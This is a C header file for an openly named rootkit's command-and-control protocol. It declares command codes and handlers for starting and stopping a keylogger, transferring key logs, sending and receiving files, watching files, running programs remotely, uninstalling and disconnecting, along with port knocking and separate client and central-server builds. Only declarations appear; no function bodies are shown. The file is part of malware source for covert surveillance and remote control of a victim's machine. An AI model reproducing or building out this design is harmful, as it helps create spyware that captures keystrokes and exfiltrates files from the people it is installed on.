#ifndef ROOTKIT_PROTOCOL_H
#define ROOTKIT_PROTOCOL_H

#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

#define COMMAND_TRIGGER_THRESHOLD 2
#define RECEIVING_PORT 8080
#define PORT_KNOCKING_PORT 30
#define INITIAL_IP 10
#define MESSAGE_BUFFER_LENGTH 1024
#define RESPONSE_BUFFER_LENGTH 4096
struct server_options;

enum command_codes {
    START_KEYLOGGER = 0x01,
    STOP_KEYLOGGER,
    GET_KEYBOARDS,
    KEY_LOG_TRANSFER,
    SEND_FILE,
    FILENAME,
    RECEIVE_FILE,
    SEND_WATCH,
    WATCH_CHANGED,
    RUN_PROGRAM,
    UNINSTALL,
    DISCONNECT,
    RESPONSE,
    UNKNOWN
};

struct packet_data {
    uint16_t sequence_number;
    uint16_t data;
    struct packet_data * next;
};

struct session_info {
#ifdef CLIENT_BUILD
    struct client_options * client_options_;
#endif
#ifdef CENTRAL_BUILD
    struct server_options * server_options_;
#endif
    struct packet_data * head;
    int command_counter; // The number of times a command was encountered
    enum command_codes last_command_code;

    int packet_counter;
    int data_counter;

    _Atomic bool run_keylogger;
};

// Function typedef
typedef void (*command_handler)(struct session_info * session_info);

// Key Pair Object
typedef struct {
    int key;
    command_handler handler;
} key_pair;

// Handler Functions
void start_keylogger(struct session_info * session_info);
void stop_keylogger(struct session_info * session_info);
void process_run_command(struct session_info * session_info);
void process_receive_file(struct session_info * session_info);
void process_send_file(struct session_info * session_info);
void handle_response(struct session_info * session_info);
void handle_get_keyboards(struct session_info * session_info);
void handle_disconnect(struct session_info * session_info);

//  Map of command codes and handler functions
static const key_pair command_handler_functions[] = {
    { START_KEYLOGGER,  start_keylogger },
    { STOP_KEYLOGGER, stop_keylogger },
    { RUN_PROGRAM, process_run_command },
    { SEND_FILE, process_send_file },
    { GET_KEYBOARDS, handle_get_keyboards },
    { RECEIVE_FILE, process_receive_file },
    { DISCONNECT, handle_disconnect },
    { RESPONSE, handle_response },
    { 0, NULL }
};

void initiate_port_knocking(const struct server_options * server_options);

// Keylogger
void send_start_keylogger(struct server_options * server_options);
void send_get_keyboards(struct server_options * server_options);
void send_stop_keylogger(struct server_options * server_options);

// Disconnect
void send_disconnect(struct server_options * server_options);

// Transfer
enum FILE_TYPE {
    T_FILE,
    T_DIRECTORY
};

void send_file(struct server_options * server_options);
void send_receive_file(const struct server_options * server_options);
void send_watch(int fd, enum FILE_TYPE file_type, char * path);


// Run program
void send_run_program(const struct server_options * server_options);


// Uninstall
void send_uninstall(int fd);


void handle_packet_data(struct session_info * session_info, struct packet_data * node);



#endif //ROOTKIT_PROTOCOL_H